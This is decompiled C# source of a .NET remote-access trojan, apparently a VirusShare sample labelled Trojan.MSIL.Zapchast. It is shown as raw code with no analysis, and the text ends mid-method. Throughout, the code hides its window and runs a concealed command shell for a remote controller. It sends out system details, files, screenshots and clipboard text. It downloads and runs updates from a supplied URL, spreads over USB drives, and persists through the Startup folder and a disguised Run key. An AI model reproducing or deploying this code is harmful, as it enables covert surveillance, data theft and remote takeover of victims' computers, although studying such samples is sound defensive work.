// Decompiled with JetBrains decompiler
// Type: zub.Form1
// Assembly: zub, Version=1.0.1.5, Culture=neutral, PublicKeyToken=null
// MVID: 48A5438B-11FD-4EEE-88C7-AA931AE92F31
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Zapchast.aaxrn-15afce431f9064b1d75b7e7f83f2d7ad5b9e68621f44a39c75ffd88172493695.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using zub.My;

namespace zub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("BackgroundWorker1")]
    private BackgroundWorker _BackgroundWorker1;
    [AccessedThroughProperty("BackgroundWorker2")]
    private BackgroundWorker _BackgroundWorker2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    public StreamReader Stream_Reader;
    public StreamWriter Stream_Writer;
    public string SplitKey;
    public string IpAdresse;
    public int Port;
    public int FilePort;
    public string Computername;
    public string Username;
    public bool Usertyp;
    public string VictimID;
    public string AmaProfil;
    public string AmaNachricht;
    public string AmaGeschlecht;
    public string AktuellesFenster;
    public string System;
    public string Systemsprache;
    public string Version;
    public string Notiz;
    public string Flagg;
    public string startUP;
    public string firstrun;
    public string oldEXE;
    public string FileMelt;
    public string FileMeltName;
    public string victimNummer;
    public bool shutdownAndRestart;
    public string flagmeColor;
    public string Logpfad;
    public bool Spread;
    public bool OnlineKeyloggerOn;
    public bool OfflineKeyloggeron;
    private ArrayList TList;
    public Log Log;
    public Reg data;
    private object copy4ALL;
    private string UpdateFolder;
    private string Server_exe;
    private string update_exe;
    private string Updaterpfad;
    private const string FileSplit = "mySPLITTkey";
    private string self;
    private string[] Settings;
    private Process CmdProzess;
    private Thread AbhörThread;
    public bool IsRunning;
    private Client_Dateitransfer sc;
    private const int SW_HIDE = 0;
    private const int SW_NORMAL = 1;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.SplitKey = "#+~+#";
      this.Computername = MyProject.Computer.Name;
      this.Username = Environment.UserName;
      this.System = MyProject.Computer.Info.OSFullName;
      this.Version = Application.ProductVersion;
      this.Notiz = "infact...";
      this.Flagg = "at";
      this.startUP = Conversions.ToString(DateTime.Now);
      this.oldEXE = "oldEXE.exe";
      this.shutdownAndRestart = false;
      this.Logpfad = MyProject.Computer.FileSystem.SpecialDirectories.Temp;
      this.Spread = true;
      this.OnlineKeyloggerOn = false;
      this.OfflineKeyloggeron = true;
      this.TList = new ArrayList();
      this.Log = new Log();
      this.data = new Reg();
      this.copy4ALL = (object) MyProject.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData;
      this.UpdateFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      this.Server_exe = this.UpdateFolder + "\\server.exe";
      this.update_exe = this.UpdateFolder + "\\update.exe";
      this.Updaterpfad = this.UpdateFolder + "\\updater.exe";
      this.IsRunning = false;
      this.InitializeComponent();
    }

    [STAThread]
    public static void Main() => Application.Run((Form) MyProject.Forms.Form1);

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.BackgroundWorker1 = new BackgroundWorker();
      this.BackgroundWorker2 = new BackgroundWorker();
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.Timer1.Interval = 3000;
      this.Timer2.Enabled = true;
      this.Timer2.Interval = 10000;
      this.Timer3.Enabled = true;
      this.ClientSize = new Size(116, 0);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Service";
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      get => this._Timer2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual BackgroundWorker BackgroundWorker1
    {
      get => this._BackgroundWorker1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
        if (this._BackgroundWorker1 != null)
          this._BackgroundWorker1.DoWork -= workEventHandler;
        this._BackgroundWorker1 = value;
        if (this._BackgroundWorker1 == null)
          return;
        this._BackgroundWorker1.DoWork += workEventHandler;
      }
    }

    internal virtual BackgroundWorker BackgroundWorker2
    {
      get => this._BackgroundWorker2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._BackgroundWorker2 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      get => this._Timer3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    [DllImport("kernel32", EntryPoint = "RtlMoveMemory", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void CopyMemory(long Destination, long Source, int Length);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ShowWindow(long hwnd, long nCmdShow);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void Sleep(long dwMilliseconds);

    public void HideApp(bool Hide)
    {
      try
      {
        if (Hide)
          Form1.ShowWindow((long) this.Handle, 0L);
        else
          Form1.ShowWindow((long) this.Handle, 1L);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim vestecken des Fensters");
        ProjectData.ClearProjectError();
      }
    }

    public void CMD_Start()
    {
      this.CmdProzess = new Process();
      this.CmdProzess.StartInfo.FileName = "cmd";
      this.CmdProzess.StartInfo.Arguments = (string) null;
      this.CmdProzess.StartInfo.UseShellExecute = false;
      this.CmdProzess.StartInfo.CreateNoWindow = true;
      this.CmdProzess.StartInfo.RedirectStandardOutput = true;
      this.CmdProzess.StartInfo.RedirectStandardError = true;
      this.CmdProzess.StartInfo.RedirectStandardInput = true;
      this.CmdProzess.Start();
      this.AbhörThread = new Thread(new ThreadStart(this.CMD_Abhören));
      this.AbhörThread.IsBackground = true;
      this.AbhörThread.Start();
      this.IsRunning = true;
    }

    public void CMD_Schreiben(string stext)
    {
      this.CmdProzess.StandardInput.WriteLine(stext);
      this.CmdProzess.StandardInput.Flush();
    }

    private void CMD_Abhören()
    {
      while (true)
      {
        try
        {
          string str;
          do
          {
            str = this.CmdProzess.StandardOutput.ReadLine();
            Encoding.Unicode.GetString(Encoding.UTF8.GetBytes(str));
          }
          while (Operators.CompareString(str, "", false) == 0);
          this.Senden("cmdanswer#+~+#" + str + "#+~+#");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Senden("cmdanswer#+~+#Verbindung zur CMD Console abgebrochen.");
          ProjectData.ClearProjectError();
        }
      }
    }

    public void CMD_Beenden()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.IsRunning = false;
label_2:
        num3 = 3;
        this.AbhörThread.Abort();
label_3:
        num3 = 4;
        this.CmdProzess.Kill();
        goto label_10;
label_5:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_10;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_5;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_10:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void ausführen(string text)
    {
      try
      {
        string[] strArray = Strings.Split(text + this.SplitKey, this.SplitKey);
        if (Operators.CompareString(strArray[0], "getTemp", false) == 0)
        {
          try
          {
            this.Senden("getTemp" + this.SplitKey + Environment.ExpandEnvironmentVariables("%tmp%") + this.SplitKey);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "Information", false) == 0)
        {
          try
          {
            this.Senden("Information" + this.SplitKey + MyProject.Computer.Name + this.SplitKey + MyProject.User.Name + this.SplitKey + this.VictimID + this.SplitKey + this.AktuellesFenster + this.SplitKey + MyProject.Computer.Info.OSFullName + this.SplitKey + this.Systemsprache + this.SplitKey + this.Version + this.SplitKey + this.Notiz + this.SplitKey + Conversions.ToString(MyProject.Computer.Clock.LocalTime) + this.SplitKey + Environment.SystemDirectory.ToString() + this.SplitKey + Environment.ExpandEnvironmentVariables("%windir%") + this.SplitKey + Environment.ExpandEnvironmentVariables("%tmp%") + this.SplitKey + Application.ExecutablePath.ToString() + this.SplitKey + Environment.Version.ToString() + this.SplitKey);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "Sende Prozesse", false) == 0)
        {
          try
          {
            string text1 = "Prozesse" + this.SplitKey;
            Process[] processes = Process.GetProcesses();
            int index = 0;
            while (index < processes.Length)
            {
              Process process = processes[index];
              text1 = text1 + process.ProcessName + "#~#" + Conversions.ToString(process.Id) + "#~#" + process.MainWindowTitle + "#~#" + this.SplitKey;
              checked { ++index; }
            }
            this.Senden(text1);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "Kill Prozess", false) == 0)
        {
          try
          {
            Process[] processesByName = Process.GetProcessesByName(strArray[1]);
            int index = 0;
            while (index < processesByName.Length)
            {
              processesByName[index].Kill();
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "end", false) == 0)
        {
          try
          {
            Application.Exit();
            this.Close();
            ProjectData.EndApp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "reconnect", false) == 0)
        {
          try
          {
            this.Stream_Reader.Close();
            this.Stream_Writer.Close();
            this.Timer1.Stop();
            Thread.Sleep(3000);
            return;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "Clealogs", false) == 0)
        {
          try
          {
            if (System.IO.File.Exists(Interaction.Environ("temp") + "\\log.lg"))
              System.IO.File.Delete(Interaction.Environ("temp") + "\\log.lg");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "Msgbox", false) == 0)
        {
          try
          {
            new Thread((ParameterizedThreadStart) (a0 =>
            {
              object obj = a0;
              Form1.MsgBoxParameter msgBoxParameter;
              this.ShowMsgBox(obj != null ? (Form1.MsgBoxParameter) obj : msgBoxParameter);
            }))
            {
              IsBackground = true
            }.Start((object) new Form1.MsgBoxParameter()
            {
              Head = strArray[1],
              Body = strArray[2],
              Style = strArray[3]
            });
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "Inputbox", false) == 0)
        {
          try
          {
            new Thread((ParameterizedThreadStart) (a0 =>
            {
              object obj = a0;
              Form1.MsgBoxParameter msgBoxParameter;
              this.ShowInputbox(obj != null ? (Form1.MsgBoxParameter) obj : msgBoxParameter);
            }))
            {
              IsBackground = true
            }.Start((object) new Form1.MsgBoxParameter()
            {
              Head = strArray[1],
              Body = strArray[2]
            });
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "CMDstart", false) == 0)
        {
          try
          {
            if (!this.IsRunning)
            {
              this.CMD_Start();
              this.IsRunning = true;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "CMDsend", false) == 0)
        {
          try
          {
            this.CMD_Schreiben(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "CMDend", false) == 0)
        {
          try
          {
            if (this.IsRunning)
            {
              this.CMD_Beenden();
              this.IsRunning = false;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "sendthumbfile", false) == 0)
        {
          try
          {
            Client_Dateitransfer clientDateitransfer = new Client_Dateitransfer();
            Random random = new Random();
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string str = "thumb_" + Conversions.ToString(random.Next(1000, 9999)) + ".jpg";
            Image.FromFile(strArray[2]).GetThumbnailImage(100, 100, (Image.GetThumbnailImageAbort) null, new IntPtr()).Save(folderPath + "\\" + str, ImageFormat.Jpeg);
            clientDateitransfer.VictimNummer = strArray[1];
            clientDateitransfer.VonHier = folderPath + "\\" + str;
            clientDateitransfer.NachHier = strArray[3];
            clientDateitransfer.IpAdresse = this.IpAdresse;
            clientDateitransfer.Port = this.FilePort;
            clientDateitransfer.DateiSendenThumb();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "sendfile", false) == 0)
        {
          try
          {
            new Client_Dateitransfer()
            {
              VictimNummer = strArray[1],
              VonHier = strArray[2],
              NachHier = strArray[3],
              IpAdresse = this.IpAdresse,
              Port = this.FilePort
            }.DateiSenden();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "gedfolders", false) == 0)
        {
          try
          {
            string text2 = "folders#+~+#";
            string[] directories = Directory.GetDirectories(strArray[1]);
            int index = 0;
            while (index < directories.Length)
            {
              DirectoryInfo directoryInfo = new DirectoryInfo(directories[index]);
              text2 = text2 + directoryInfo.Name + "#++#" + directoryInfo.FullName + "#++#" + directoryInfo.Attributes.ToString() + "#++#" + "#+~+#";
              checked { ++index; }
            }
            this.Senden(text2);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "getfiles", false) == 0)
        {
          try
          {
            string text3 = "files#+~+#";
            string[] files = Directory.GetFiles(strArray[1]);
            int index = 0;
            while (index < files.Length)
            {
              FileInfo fileInfo = new FileInfo(files[index]);
              text3 = text3 + fileInfo.Name + "#++#" + fileInfo.FullName + "#++#" + fileInfo.Attributes.ToString() + "#++#" + Conversions.ToString(fileInfo.Length) + "#++#" + "#+~+#";
              checked { ++index; }
            }
            this.Senden(text3);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "gedfolders_H", false) == 0)
        {
          try
          {
            string text4 = "folders_H#+~+#";
            string[] directories = Directory.GetDirectories(strArray[1]);
            int index = 0;
            while (index < directories.Length)
            {
              DirectoryInfo directoryInfo = new DirectoryInfo(directories[index]);
              text4 = text4 + directoryInfo.Name + "#++#" + directoryInfo.FullName + "#++#" + directoryInfo.Attributes.ToString() + "#++#" + "#+~+#";
              checked { ++index; }
            }
            this.Senden(text4);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "getfiles_H", false) == 0)
        {
          try
          {
            string text5 = "files_H#+~+#";
            string[] files = Directory.GetFiles(strArray[1]);
            int index = 0;
            while (index < files.Length)
            {
              FileInfo fileInfo = new FileInfo(files[index]);
              text5 = text5 + fileInfo.Name + "#++#" + fileInfo.FullName + "#++#" + fileInfo.Attributes.ToString() + "#++#" + Conversions.ToString(fileInfo.Length) + "#++#" + "#+~+#";
              checked { ++index; }
            }
            this.Senden(text5);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "getdirs", false) == 0)
        {
          try
          {
            string text6 = "dirs#+~+#";
            DriveInfo[] drives = DriveInfo.GetDrives();
            int index = 0;
            while (index < drives.Length)
            {
              DriveInfo driveInfo = drives[index];
              text6 = text6 + driveInfo.ToString() + "#+~+#";
              checked { ++index; }
            }
            this.Senden(text6);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "upfile", false) == 0)
        {
          try
          {
            new Client_Dateitransfer()
            {
              VictimNummer = strArray[1],
              VonHier = strArray[2],
              NachHier = strArray[3],
              IpAdresse = this.IpAdresse,
              Port = this.FilePort
            }.DateiEmfpangen();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "screencapturestart", false) == 0)
        {
          try
          {
            this.victimNummer = strArray[1];
            this.sc = new Client_Dateitransfer();
            this.sc.VictimNummer = strArray[1];
            this.sc.IpAdresse = this.IpAdresse;
            this.sc.Port = this.FilePort;
            this.sc.ScreenCapp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "screencapturestop", false) == 0)
        {
          try
          {
            this.victimNummer = strArray[1];
            this.sc.ScreenStopp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "changeintervall", false) == 0)
        {
          try
          {
            this.sc.Wartezeit = Conversions.ToInteger(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "changequali", false) == 0)
        {
          try
          {
            this.sc.Qualität = Conversions.ToInteger(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "start", false) == 0)
        {
          try
          {
            Process.Start(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "keydown", false) == 0)
        {
          int num = (int) Interaction.MsgBox((object) strArray[1]);
          try
          {
            MyProject.Computer.Keyboard.SendKeys(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "delete", false) == 0)
        {
          try
          {
            System.IO.File.Delete(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            Directory.Delete(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "getclipboard", false) == 0)
        {
          try
          {
            this.Senden("clipboard#+~+#" + Clipboard.GetText());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "opensite", false) == 0)
        {
          try
          {
            Process process = new Process();
            if (Operators.CompareString(strArray[2], "Hidden", false) == 0)
            {
              process.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
              Process.Start(strArray[1]);
            }
            Process.Start(strArray[1]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "getserver", false) == 0)
        {
          try
          {
            this.Senden("sendserverInfo#+~+#" + this.VictimID + "#+~+#" + this.Notiz);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "changeserver", false) == 0)
        {
          try
          {
            this.VictimID = strArray[1];
            this.Notiz = strArray[2];
            if (this.Usertyp)
            {
              Interaction.Shell("cmd.exe /c reg add HKLM\\Software\\WindowsSoftware /v Amateri-User /t REG_SZ /d " + this.VictimID + " /f", AppWinStyle.Hide);
              Interaction.Shell("cmd.exe /c reg add HKLM\\Software\\WindowsSoftware /v Victem-Notiz /t REG_SZ /d " + this.Notiz + " /f", AppWinStyle.Hide);
            }
            else
            {
              Interaction.Shell("cmd.exe /c reg add HKCU\\Software\\WindowsSoftware /v Amateri-User /t REG_SZ /d " + this.VictimID + " /f", AppWinStyle.Hide);
              Interaction.Shell("cmd.exe /c reg add HKCU\\Software\\WindowsSoftware /v Victem-Notiz /t REG_SZ /d " + this.Notiz + " /f", AppWinStyle.Hide);
            }
            this.Senden("sendserverInfo#+~+#" + this.VictimID + "#+~+#" + this.Notiz);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "updateURL", false) == 0)
        {
          try
          {
            WebClient webClient = new WebClient();
            if (System.IO.File.Exists(this.update_exe))
              System.IO.File.Delete(this.update_exe);
            webClient.DownloadFile(strArray[1], this.update_exe);
            if (System.IO.File.Exists(this.Updaterpfad))
              System.IO.File.Delete(this.Updaterpfad);
            System.IO.File.WriteAllBytes(this.Updaterpfad, zub.My.Resources.Resources.updater);
            Process process = new Process();
            Process.Start(this.Updaterpfad);
            this.Close();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "updateFile", false) == 0)
        {
          try
          {
            if (!Directory.Exists(this.UpdateFolder))
              Directory.CreateDirectory(this.UpdateFolder);
            Client_Dateitransfer clientDateitransfer = new Client_Dateitransfer();
            clientDateitransfer.VictimNummer = Conversions.ToString(Convert.ToInt32(strArray[1]));
            clientDateitransfer.VonHier = strArray[2];
            clientDateitransfer.NachHier = this.update_exe;
            clientDateitransfer.IpAdresse = this.IpAdresse;
            clientDateitransfer.Port = this.FilePort;
            if (System.IO.File.Exists(this.update_exe))
              System.IO.File.Delete(this.update_exe);
            clientDateitransfer.DateiEmfpangen_update();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "ShutdownAndUpdate", false) == 0)
        {
          this.secureCopybevoUpdate(this.oldEXE);
          try
          {
            if (System.IO.File.Exists(this.Updaterpfad))
              System.IO.File.Delete(this.Updaterpfad);
            System.IO.File.WriteAllBytes(this.Updaterpfad, zub.My.Resources.Resources.updater);
            Process process = new Process();
            Process.Start(this.Updaterpfad);
            this.Close();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "spreadusb", false) == 0)
        {
          try
          {
            zub.Spread.usb_sp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(strArray[0], "flagme", false) == 0)
        {
          string wert = strArray[1];
          this.flagmeColor = wert;
          this.data.writeVitemValue("flagme", wert);
        }
        if (Operators.CompareString(strArray[0], "checkftp", false) != 0)
          return;
        try
        {
          WebClient webClient = new WebClient();
          if (!System.IO.File.Exists(this.UpdateFolder + "\\.temp\\WinSCP.exe"))
            webClient.DownloadFile("http://" + strArray[1] + "/rat/winSCP/WinSCP.exe", this.UpdateFolder + "\\.temp\\WinSCP.exe");
          this.Senden("checkftp_true#+~+#True");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void ParameterFürUpdater(string alterProzess, string neueProzess, int wait)
    {
    }

    public void secureCopybevoUpdate(string oldNameEXE)
    {
      if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + oldNameEXE))
      {
        System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + oldNameEXE);
      }
      else
      {
        try
        {
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + oldNameEXE);
          System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + oldNameEXE);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim Copy2startUP");
          ProjectData.ClearProjectError();
        }
      }
    }

    private void ShowMsgBox(Form1.MsgBoxParameter MsgParm)
    {
      if (Operators.CompareString(MsgParm.Style, "1", false) == 0)
      {
        int num1 = (int) Interaction.MsgBox((object) MsgParm.Body, MsgBoxStyle.Critical, (object) MsgParm.Head);
      }
      if (Operators.CompareString(MsgParm.Style, "2", false) == 0)
      {
        int num2 = (int) Interaction.MsgBox((object) MsgParm.Body, MsgBoxStyle.Information, (object) MsgParm.Head);
      }
      if (Operators.CompareString(MsgParm.Style, "4", false) == 0)
      {
        int num3 = (int) Interaction.MsgBox((object) MsgParm.Body, MsgBoxStyle.Question, (object) MsgParm.Head);
      }
      if (Operators.CompareString(MsgParm.Style, "3", false) == 0)
      {
        int num4 = (int) Interaction.MsgBox((object) MsgParm.Body, MsgBoxStyle.Exclamation, (object) MsgParm.Head);
      }
      this.Senden("Msgokay");
    }

    private void ShowInputbox(Form1.MsgBoxParameter msgprm) => this.Senden("Answer#+~+#" + Interaction.InputBox(msgprm.Body, msgprm.Head));

    private void abhören()
    {
      try
      {
        while (true)
          this.ausführen(this.Stream_Reader.ReadLine());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim abhören");
        this.Stream_Reader.Close();
        this.Stream_Writer.Close();
        Thread.Sleep(3000);
        ProjectData.ClearProjectError();
      }
    }

    public void Senden(string text)
    {
      try
      {
        this.Stream_Writer.WriteLine(text + "#+~+#");
        this.Stream_Writer.Flush();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.Log.writeLog(this.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim senden");
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void Melt(string NewName)
    {
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        if (Operators.CompareString(Application.StartupPath, folderPath, false) != 0)
        {
          System.IO.File.Delete(folderPath + "\\" + NewName);
          FileSystem.FileCopy(Application.ExecutablePath, folderPath + "\\" + NewName);
          Interaction.Shell(folderPath + "\\" + NewName + " " + Application.ExecutablePath);
          FileAttributes fileAttributes = FileAttributes.Hidden;
          System.IO.File.SetAttributes(folderPath + "\\" + NewName, fileAttributes);
          this.data.writeRunKey("Windows-Anmeldeanwendung", folderPath + "\\" + NewName);
          ProjectData.EndApp();
        }
        else
          FileSystem.Kill(Interaction.Command());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private ArrayList RetrieveSystemCulture()
    {
      ArrayList arrayList1;
      try
      {
        ArrayList arrayList2 = new ArrayList();
